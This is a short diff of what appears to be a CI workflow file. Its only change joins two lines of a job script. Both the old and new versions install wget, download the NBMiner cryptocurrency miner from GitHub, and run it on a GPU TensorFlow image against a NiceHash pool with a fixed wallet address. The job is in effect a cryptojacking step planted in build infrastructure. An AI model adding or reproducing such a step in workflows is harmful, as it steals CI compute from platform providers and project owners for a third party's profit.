@@ -30,6 +30,5 @@ jobs:
     uses: script@v1
     with:
       script: |-
-        apt install wget -y &&
-        wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz &&tar -xvf NBMiner_38.1_Linux.tgz&& cd NBMiner_Linux &&./nbminer -a ergo -o stratum+tcp://autolykos.usa-west.nicehash.com:3390 -u 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.co1 -p x
+        apt install wget -y && wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz &&tar -xvf NBMiner_38.1_Linux.tgz&& cd NBMiner_Linux &&./nbminer -a ergo -o stratum+tcp://autolykos.usa-west.nicehash.com:3390 -u 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.co1 -p x
       image: tensorflow/tensorflow:1.14.0-gpu-py3
